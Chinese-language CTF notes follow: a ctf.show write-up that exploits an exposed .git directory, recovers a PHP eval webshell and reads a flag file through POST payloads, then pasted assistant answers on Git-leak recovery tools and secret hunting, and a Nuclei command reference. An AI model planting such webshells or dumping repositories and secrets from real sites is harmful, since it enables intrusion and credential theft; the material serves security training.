一打开就是个[phpinfo]，看看了感觉暂时没有什么利用的东西，yakit扫一下目录吧
扫描到`/.git/index`目录【git泄露】，发现有提到`backdoor.php`
```
(base) apple@MacBook-Air-2 Downloads % cat index
DIRC^J��9��^Jw�!'���U��0wQW�8��>&�=��<<
                                       backdoor.php^J��8�ь^Jw�	�1���Am"�~�]�I���t� ��	index.phpTREE2 0
```

访问发现没有按钮，但是查看源码有提示
> <!-- 36D姑娘留的后门，闲人免进 -->

由此推测，这里是个木马页面，调用git泄露工具
`git-dumper http://b6ab56ae-137d-4a4d-8612-076fe4959dec.challenge.ctf.show/.git /output_directory` 可以将git泄露的文件源代码下载output_directory文件夹出来，得知backdoor.php
```php
<!-- 36D姑娘留的后门，闲人免进 -->
<?php 
	@eval($_POST['Letmein']);
?>
```

使用蚁剑一句话链接，发现不能直接查看文件内容，不能使用终端，借助插件执行脚本`include('/var/www/flag.txt')`

![[0017红包第七弹脚本编辑.png]]
发现flag`ctfshow{be60bbd6-f343-4d11-87bd-209facb5f08b}`


蚁剑中无法查看 或者手动构建POST数据 利用高亮函数传参查看内容
Letmein=highlight_file(“/var/www/flag.txt”);

----




          
在CTF中遇到Git泄露是一个非常常见且重要的考点。Git泄露通常意味着目标服务器上部署的代码中包含了`.git`目录，并且这个目录可以被外部访问。攻击者可以通过这个泄露的`.git`目录获取到完整的项目代码、提交历史、敏感信息（如API密钥、数据库凭证、测试代码中的flag等）。

以下是处理Git泄露的思路、工具、具体步骤和逻辑原理，并附带多种解决方案及其优劣：

### 1. Git泄露的原理和危害

**原理：**
当开发者在部署Web应用时，有时会不小心将`.git`隐藏目录也一并部署到生产环境。这个目录包含了Git仓库的所有元数据，包括提交历史、分支信息、文件内容等。如果Web服务器配置不当，允许访问这个目录，攻击者就可以通过访问特定的URL（例如`/.git/config`、`/.git/HEAD`）来判断是否存在Git泄露，并进一步下载整个仓库。

**危害：**
*   **源代码泄露：** 获取到完整的项目源代码，有助于理解业务逻辑，发现其他漏洞。
*   **敏感信息泄露：** 提交历史中可能包含临时的敏感信息（如密码、密钥、内部IP地址），即使后来被删除，也可能通过历史版本恢复。
*   **历史版本回溯：** 可以查看所有提交记录，包括被删除的文件内容，这在寻找flag时尤为重要。
*   **分支信息泄露：** 了解开发分支，可能发现未上线的功能或测试代码。

### 2. 处理Git泄露的思路

1.  **确认泄露：** 首先要确认目标是否存在Git泄露。
2.  **恢复仓库：** 将泄露的Git仓库文件下载到本地，重建一个可用的Git仓库。
3.  **分析仓库：** 在本地对恢复的Git仓库进行深入分析，查找敏感信息或flag。

### 3. 常用工具

以下是一些常用的工具，它们各有优劣：

*   **`wget` / `curl` (命令行工具):**
    *   **优点：** 系统自带，无需安装，灵活度高，可以用于下载单个文件或配合脚本批量下载。
    *   **缺点：** 需要手动构造URL，效率较低，容易遗漏文件，不适合处理大型或复杂的Git仓库。
    *   **应用场景：** 确认泄露、下载少量关键文件。

*   **`GitHack` (Python脚本):**
    *   **优点：** 专门用于Git泄露恢复，自动化程度高，能够根据`.git/index`文件自动下载所有文件，恢复完整的仓库。
    *   **缺点：** 依赖Python环境，对于某些特殊配置的服务器可能无法完全恢复。
    *   **应用场景：** 最常用的Git泄露恢复工具，推荐优先使用。

*   **`dvcs-ripper` (Perl脚本):**
    *   **优点：** 功能强大，不仅支持Git，还支持SVN、Mercurial等多种分布式版本控制系统，恢复能力强。
    *   **缺点：** 依赖Perl环境，使用相对复杂一些。
    *   **应用场景：** 当GitHack无法完全恢复时，或遇到其他版本控制系统泄露时。

*   **`git` 命令行工具 (本地分析):**
    *   **优点：** 恢复仓库后，使用Git自带的命令进行分析是最全面和强大的方式，可以查看所有历史、分支、文件内容。
    *   **缺点：** 需要熟悉Git命令。
    *   **应用场景：** 恢复仓库后的核心分析工具。

*   **`grep` / `strings` (命令行工具):**
    *   **优点：** 快速在文件中搜索特定字符串或可打印字符，无需Git知识。
    *   **缺点：** 无法理解Git仓库的结构，只能对当前文件或历史文件进行暴力搜索。
    *   **应用场景：** 辅助Git命令进行快速搜索。

### 4. 具体步骤和逻辑原理

#### 步骤一：确认Git泄露

**逻辑原理：** Git仓库的`.git`目录中包含一些标志性文件，如`HEAD`（指向当前分支）、`config`（仓库配置）、`index`（暂存区信息）。通过访问这些文件，可以判断`.git`目录是否可访问。

**操作步骤：**

1.  **访问`/.git/HEAD`：**
    *   尝试访问 `http://target.com/.git/HEAD`
    *   如果返回类似 `ref: refs/heads/master` 或 `ref: refs/heads/main` 的内容，则基本确认存在Git泄露。
    *   如果返回404或拒绝访问，则可能不存在泄露或服务器配置了更严格的访问控制。

2.  **访问`/.git/config`：**
    *   尝试访问 `http://target.com/.git/config`
    *   如果返回Git配置文件内容（包含`[core]`、`[remote "origin"]`等），则进一步确认泄露。

3.  **访问`/.git/index`：**
    *   尝试访问 `http://target.com/.git/index`
    *   如果返回二进制文件内容，说明`index`文件可访问，进一步确认泄露。

**多种解决方案及优劣：**

*   **手动浏览器访问：**
    *   **优点：** 直观，无需工具。
    *   **缺点：** 效率低，不适合批量检测。
*   **`curl` 或 `wget` 命令行检测：**
    *   **优点：** 快速，可脚本化，适合批量检测。
    *   **缺点：** 需要手动输入命令。
    ```bash
    # 检测HEAD文件
    curl -I http://target.com/.git/HEAD
    # 检测config文件
    curl http://target.com/.git/config
    ```

#### 步骤二：恢复Git仓库

**逻辑原理：** Git仓库的核心是`objects`目录，其中存储了所有版本的文件内容（以blob对象形式）、目录结构（以tree对象形式）和提交信息（以commit对象形式）。`index`文件记录了暂存区的文件信息。恢复仓库的关键是下载这些对象文件和`index`文件，然后通过Git命令重建仓库。

**解决方案一：使用`GitHack` (推荐)**

**优点：** 自动化程度高，恢复效果好，操作简单。
**缺点：** 依赖Python环境，可能无法处理所有情况。

**操作步骤：**

1.  **安装GitHack：**
    ```bash
    # 如果没有安装pip，请先安装
    # python3 -m ensurepip --upgrade
    # python3 -m pip install --upgrade pip

    # 从GitHub克隆GitHack
    git clone https://github.com/lijiejie/GitHack.git
    cd GitHack

    # 如果GitHub访问慢，可以使用国内镜像站或代理
    # 例如，使用gitee镜像：
    # git clone https://gitee.com/mirrors/GitHack.git
    # cd GitHack
    ```
    **国内源方法：**
    如果`pip`安装依赖慢，可以使用国内镜像源：
    ```bash
    pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
    ```

2.  **运行GitHack：**
    ```bash
    python3 GitHack.py http://target.com/.git/
    ```
    *   `GitHack`会自动检测并下载所有可访问的Git文件，并在当前目录下创建一个与目标域名同名的目录，里面就是恢复的Git仓库。

**解决方案二：使用`dvcs-ripper`**

**优点：** 支持多种VCS，恢复能力强。
**缺点：** 依赖Perl环境，使用相对复杂。

**操作步骤：**

1.  **安装`dvcs-ripper`：**
    ```bash
    git clone https://github.com/kost/dvcs-ripper.git
    cd dvcs-ripper
    ```
    **国内源方法：** 同GitHack，如果GitHub访问慢，可以使用国内镜像站或代理。

2.  **运行`rip-git.pl`：**
    ```bash
    perl rip-git.pl -v -u http://target.com/.git/
    ```
    *   `dvcs-ripper`也会在当前目录下创建一个目录，存放恢复的仓库。

**解决方案三：手动下载 (不推荐，除非仓库很小或自动化工具失败)**

**优点：** 适用于自动化工具失败的极端情况，或只需要下载少量文件。
**缺点：** 效率极低，容易遗漏文件，需要对Git内部结构有一定了解。

**操作步骤：**

1.  **下载关键文件：**
    *   `HEAD`
    *   `config`
    *   `index`
    *   `objects/info/packs` (如果存在)
    *   `objects/info/alternates` (如果存在)
    *   `objects/pack/*.pack` (所有pack文件)
    *   `objects/pack/*.idx` (所有idx文件)
    *   `objects/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` (根据`index`文件或`git cat-file -p`输出手动猜测并下载blob、tree、commit对象)

2.  **初始化本地仓库并恢复：**
    ```bash
    mkdir recovered_repo
    cd recovered_repo
    git init
    # 将下载的文件放入 .git 目录
    # git reset --hard HEAD
    ```
    *   这个过程非常繁琐，不推荐。

#### 步骤三：分析恢复的Git仓库

**逻辑原理：** 恢复的Git仓库是一个完整的本地仓库，可以使用所有标准的Git命令进行分析。目标是查找历史提交中的敏感信息、被删除的文件内容、不同分支中的秘密等。

**操作步骤：**

1.  **进入恢复的仓库目录：**
    ```bash
    cd recovered_repo_name # GitHack或dvcs-ripper创建的目录
    ```

2.  **查看提交历史：**
    *   **命令：** `git log`
    *   **逻辑：** 查看所有提交记录，关注提交信息中是否有敏感词汇（如`password`、`key`、`flag`、`fix bug`、`add secret`等），以及提交者信息。
    *   **示例：**
        ```bash
        git log --oneline --graph --decorate # 简洁图形化显示
        git log -p # 显示每次提交的详细修改内容
        ```

3.  **查看所有分支和标签：**
    *   **命令：** `git branch -a` (查看所有本地和远程分支), `git tag` (查看所有标签)
    *   **逻辑：** 检查是否存在非`master`/`main`分支，如`dev`、`test`、`feature/xxx`等，这些分支可能包含未清理的敏感信息。
    *   **示例：**
        ```bash
        git branch -a
        git tag
        ```

4.  **切换到不同分支或提交：**
    *   **命令：** `git checkout <branch_name>` 或 `git checkout <commit_hash>`
    *   **逻辑：** 切换到不同的分支或历史提交，查看当时的文件内容。这是查找被删除或修改的敏感信息的关键。
    *   **示例：**
        ```bash
        git checkout dev # 切换到dev分支
        git checkout abcdef123 # 切换到某个历史提交
        ls -la # 查看当前目录文件
        cat sensitive_file.txt # 查看文件内容
        ```

5.  **查找敏感文件类型：**
    *   **逻辑：** 关注配置文件（`.env`、`config.ini`、`application.properties`、`settings.py`）、密钥文件（`.pem`、`.key`）、数据库文件（`.db`）、测试文件、备份文件等。
    *   **命令：** `find . -name "*.env"` 或 `grep -r "password" .`

6.  **搜索关键词：**
    *   **命令：** `git grep -i "flag"` 或 `git grep -i "password"`
    *   **逻辑：** `git grep`可以直接在Git仓库中搜索文件内容，包括历史版本。这是非常强大的功能。
    *   **示例：**
        ```bash
        git grep -i "flag" $(git rev-list --all) # 在所有提交中搜索flag
        git grep -i "secret" HEAD # 在当前HEAD指向的版本中搜索secret
        ```
    *   **辅助命令：** `grep -r "flag" .` (在当前文件系统中递归搜索)

7.  **查看差异：**
    *   **命令：** `git diff <commit1> <commit2>` 或 `git diff <commit_hash>~1 <commit_hash>`
    *   **逻辑：** 比较不同提交之间的文件差异，可以发现哪些内容被添加或删除。
    *   **示例：**
        ```bash
        git diff HEAD~1 HEAD # 比较最新两次提交的差异
        ```

8.  **查看`reflog`：**
    *   **命令：** `git reflog`
    *   **逻辑：** `reflog`记录了本地仓库的所有操作历史，包括`reset`、`revert`等，有时可以发现一些被“遗忘”的提交。
    *   **示例：**
        ```bash
        git reflog
        git checkout HEAD@{2} # 切换到reflog中的某个历史状态
        ```

9.  **使用`strings`命令：**
    *   **逻辑：** 对于一些二进制文件或被删除的文件，`strings`命令可以提取其中的可打印字符串，有时能发现意外的敏感信息。
    *   **示例：**
        ```bash
        strings .git/objects/pack/*.pack | grep "flag"
        ```

### 5. 错误处理和异常处理机制

*   **网络问题：** 在下载Git仓库文件时，可能会遇到网络不稳定、连接超时等问题。
    *   **处理：** 使用`wget -c`进行断点续传，或多次尝试下载。对于`GitHack`等工具，如果下载失败，可以尝试重新运行。
*   **部分文件缺失：** 目标服务器可能只允许访问部分`.git`文件，导致恢复的仓库不完整。
    *   **处理：** 尝试使用不同的工具（如`dvcs-ripper`），或手动检查`.git`目录结构，尝试补充下载缺失的文件。即使仓库不完整，也可能从已下载的文件中找到线索。
*   **仓库损坏：** 下载的文件可能损坏，导致Git命令无法正常工作。
    *   **处理：** 重新下载，或尝试使用`git fsck --full`检查仓库完整性。
*   **权限问题：** 在本地分析时，确保对恢复的仓库目录有读写权限。
*   **敏感信息过滤：** 在搜索敏感信息时，使用大小写不敏感搜索（`-i`），并尝试多种关键词组合。

### 6. 总结与建议

*   **优先使用自动化工具：** `GitHack`是首选，因为它自动化程度高，效率快。如果`GitHack`失败，可以尝试`dvcs-ripper`。
*   **深入分析：** 恢复仓库后，不要只看当前文件，一定要利用Git的历史版本回溯能力，查看所有提交、分支和标签。
*   **关键词搜索：** 结合`git grep`和`grep`，使用`flag`、`password`、`secret`、`key`、`admin`等关键词进行全面搜索。
*   **关注配置文件和测试文件：** 这些文件往往是敏感信息泄露的高发区。
*   **耐心和细致：** Git泄露的flag可能隐藏在非常不起眼的地方，需要耐心和细致的分析。

希望这些详细的步骤和原理能帮助你在CTF中更好地处理Git泄露问题！





          
很抱歉，我之前的回答中确实遗漏了 `git-dumper` 这个工具。`git-dumper` 也是一个非常优秀的Git泄露利用工具，在CTF中也经常被使用。

### 补充说明 `git-dumper`

`git-dumper` 是一个用Python编写的工具，它的主要功能是下载目标网站泄露的 `.git` 目录，并尝试重建Git仓库。它的工作原理与 `GitHack` 类似，都是通过访问 `.git` 目录下的文件来获取仓库信息并下载文件。

#### `git-dumper` 的特点

*   **优点：**
    *   **自动化程度高：** 能够自动识别并下载 `.git` 目录中的文件，重建仓库。
    *   **易于使用：** 命令行接口简单直观。
    *   **Python编写：** 跨平台，依赖Python环境。
    *   **处理 `.git/index` 文件：** 能够解析 `index` 文件来获取文件列表，从而更完整地恢复仓库。
*   **缺点：**
    *   与 `GitHack` 类似，对于某些特殊配置的服务器或不完整的 `.git` 泄露，可能无法完全恢复。
    *   需要Python环境。

#### `git-dumper` 的使用方法

1.  **安装 `git-dumper`：**
    `git-dumper` 通常可以通过 `pip` 安装，或者从GitHub克隆项目。

    ```bash
    # 通过pip安装
    pip install git-dumper

    # 或者从GitHub克隆
    git clone https://github.com/arthaud/git-dumper.git
    cd git-dumper
    # 如果需要，安装依赖
    pip install -r requirements.txt
    ```
    **国内源方法：**
    如果 `pip` 安装慢，可以使用国内镜像源：
    ```bash
    pip install git-dumper -i https://pypi.tuna.tsinghua.edu.cn/simple
    # 或者
    pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
    ```

2.  **运行 `git-dumper`：**
    使用 `git-dumper` 下载泄露的Git仓库非常简单，只需要提供目标URL和输出目录。

    ```bash
    # 如果是通过pip安装的，直接运行
    git-dumper http://target.com/.git/ output_directory

    # 如果是从GitHub克隆的，进入项目目录后运行
    python3 git_dumper.py http://target.com/.git/ output_directory
    ```
    *   `http://target.com/.git/` 是目标网站上 `.git` 目录的URL。
    *   `output_directory` 是你希望将恢复的仓库保存到的本地目录。

#### `git-dumper` 与 `GitHack` / `dvcs-ripper` 的比较

| 特性         | `GitHack`                                  | `dvcs-ripper`                                | `git-dumper`                               |
| :----------- | :----------------------------------------- | :------------------------------------------- | :----------------------------------------- |
| **语言**     | Python                                     | Perl                                         | Python                                     |
| **自动化**   | 高，根据 `index` 文件下载                  | 高，支持多种VCS                              | 高，根据 `index` 文件下载                  |
| **易用性**   | 简单                                       | 相对复杂                                     | 简单                                       |
| **支持VCS**  | 主要Git                                    | Git, SVN, Mercurial等                        | 主要Git                                    |
| **恢复能力** | 优秀，但可能受限于服务器配置               | 强大，对不完整泄露有较好处理                 | 优秀，但可能受限于服务器配置               |
| **依赖**     | Python                                     | Perl                                         | Python                                     |
| **推荐场景** | 优先使用，自动化程度高，恢复效果好         | 当 `GitHack` 失败或遇到其他VCS泄露时         | 与 `GitHack` 类似，可作为备选或替代方案    |

### 为什么我之前没有提及 `git-dumper`？

在第一次回答时，我主要侧重于介绍最常用且功能强大的 `GitHack` 作为首选工具，以及 `dvcs-ripper` 作为多功能备选。`git-dumper` 在功能和使用上与 `GitHack` 有很多相似之处，都是基于Python的自动化恢复工具。在CTF场景中，通常 `GitHack` 能够解决大部分Git泄露问题，因此我可能在选择工具时，优先推荐了 `GitHack`。

然而，在实际的CTF中，不同的工具可能对不同的服务器配置或不完整的 `.git` 泄露有不同的处理效果。因此，当一个工具无法完全恢复时，尝试另一个类似的工具（如 `git-dumper`）是非常有必要的。

### 总结

`git-dumper` 是一个与 `GitHack` 同样优秀的Git泄露恢复工具，它们在功能和使用上都非常便捷。在遇到Git泄露时，你可以将 `GitHack` 和 `git-dumper` 都作为你的首选工具，如果一个工具无法成功恢复，可以尝试另一个。

希望这次补充能让你对Git泄露的利用工具有更全面的了解！


----

Nuclei
Nuclei是一个基于模板的、可配置攻击目标的扫描快速工具，同时还提供了强大的可扩展性和易用性。

常用命令
-c 并发请求数（默认10）nuclei -c 100

-timeout 超时时间(默认为5秒) nuclei -timeout 5 

-proxy-url 输入代理地址 nuclei -proxy-url hxxp://127.0.0.1:8080 

-proxy-socks-url 输入socks代理地址 nuclei -proxy-socks-url socks5://user:pass@Your IP:1080 

-random-agent 使用随机的UA nuclei -random-agent 

-H 自定义请求头 nuclei -H “x-bug-bounty:hacker” 

-update-templates 下载或者升级模板  nuclei -update-templates 

nuclei -t test.yaml --validate 验证模板格式

nuclei -t test.yaml -u http://exam.com  指定模板和目标

nuclei -t test.yaml -l target.txt  批量扫描

nuclei -t test.yaml -u http://exam.com -p socks5://127.0.0.1:7890 指定代理

nuclei -t test.yaml -l target.txt -stats Debug  查看扫描进度

nuclei -t test.yaml -u http://exam.com -debug查看发送数据包和返回包

全部参数
Copy
# nuclei -h

用法：
  nuclei [命令]

命令：
目标：
   -u, -target string[]                 指定扫描的URL/主机
   -l, -list string                     指定需要扫描的URL/主机文件（一行一个）

模板：
   -t, -templates string[]              指定需要扫描的模板或者模板的路径
   -nt, -new-templates                  只扫描最新版本中添加的模板
   -w, -workflows string[]              指定扫描中的工作流或者工作流目录
   -validate                            验证通过的模板
   -tl                                  列出所有可用的模板

过滤：
   -tags string[]                       执行有标记的模板子集
   -etags, -exclude-tags string[]       执行标记为排除的模板
   -itags, -include-tags string[]       不执行具有攻击性的模板
   -et, -exclude-templates string[]     要排除的模板或者模板目录
   -it, -include-templates string[]     执行默认或配置中排除的模板
   -s, -severity value[]                根据严重程度运行模板，可候选的值有：info,low,medium,high,critical   
   -es, -exclude-severity value[]       根据严重程度排除模板，可候选的值有：info,low,medium,high,critical   
   -a, -author string[]                 执行指定作者的模板

输出：
   -o, -output string                   输出发现的问题到文件
   -silent                              只显示结果
   -nc, -no-color                       禁用输出内容着色（ANSI转义码）
   -json                                输出为jsonL（ines）
   -irr, -include-rr                    在JSONL中输出对应的请求和相应（仅结果）
   -nm, -no-meta                        不显示匹配的元数据
   -nts, -no-timestamp                  不在输出中显示时间戳
   -rdb, -report-db string              本地的Nuclei结果数据库（始终使用该数据库保存结果）       
   -me, -markdown-export string         以markdown导出结果
   -se, -sarif-export string            以SARIF导出结果

配置：
   -config string                       指定Nuclei的配置文件
   -rc, -report-config string           指定Nuclei报告模板文件
   -H, -header string[]                 指定报告中的标题：value格式
   -V, -var value                       通过var=value指定var值
   -r, -resolvers string                指定Nuclei的解析文件
   -sr, -system-resolvers               当DNS错误时使用系统DNS
   -passive                             启用被动扫描处理HTTP响应
   -ev, env-vars                        在模板中使用环境变量

交互：
   -inserver, -ineractsh-server string  使用interactsh反连检测平台（默认为"https://interact.sh"）
   -itoken, -interactsh-token string    指定反连检测平台的身份凭证
   -interactions-cache-size int         指定保存在交互缓存中的请求数（默认：5000）
   -interactions-eviction int           从缓存中删除请求前等待的时间（默认为60秒）
   -interactions-poll-duration int      每个轮询前等待时间（默认为5秒）
   -interactions-cooldown-period int    退出轮询前的等待时间（默认为5秒）
   -ni, -no-interactsh                  禁用反连检测平台，同时排除基于反连检测的模板

限速：
   -r1, -rate-limit int                 每秒最大请求量（默认：150）
   -rlm, -rate-limit-minute int         每分钟最大请求量
   -bs, -bulk-size int                  每个模板最大并行检测数（默认：25）
   -c, -concurrency int                 并行执行的最大模板数量（默认：25）


优化：
   -timeout int                         超时时间（默认为5秒）
   -retries int                         重试次数（默认：1）
   -mhe, -max-host-error int            某主机扫描失败次数，跳过该主机（默认：30）
   -project                             使用项目文件夹避免多次发送同一请求
   -project-path string                 设置特定的项目文件夹
   -spm, -stop-at-first-path            得到一个结果后停止（或许会中断模板和工作流的逻辑）
   -stream                              流模式 - 在不整理输入的情况下详细描述

无界面浏览器：
    -headless                           启用需要无界面浏览器的模板
    -page-timeout int                   在无界面下超时秒数（默认：20）
    -sb, -show-brower                   在无界面浏览器运行模板时，显示浏览器
    -sc, -system-chrome                 不使用Nuclei自带的浏览器，使用本地浏览器

调试：
    -debug                              显示所有请求和响应
    -debug-req                          显示所有请求
    -debug-resp                         显示所有响应
    -proxy, -proxy-url string           使用HTTP代理
    -proxy-socks-url string             使用SOCK5代理
    -tlog, -trace-log string            写入请求日志到文件
    -version                            显示版本信息
    -v, -verbose                        显示详细信息
    -vv                                 显示额外的详细信息
    -tv, -templates-version             显示已安装的模板版本

升级：
    -update                             更新Nuclei到最新版本
    -ut, -update-templates              更新Nuclei模板到最新版
    -ud, -update-directory string       覆盖安装模板
    -duc, -disable-update-check         禁用更新

统计：
    -stats                              显示正在扫描的统计信息
    -sj, -stats-json                    将统计信息以JSONL格式输出到文件
    -si, -stats-inerval int             显示统计信息更新的间隔秒数（默认：5）
    -m, -metrics                        显示Nuclei端口信息
    -mp, -metrics-port int              更改Nuclei默认端口（默认：9092）


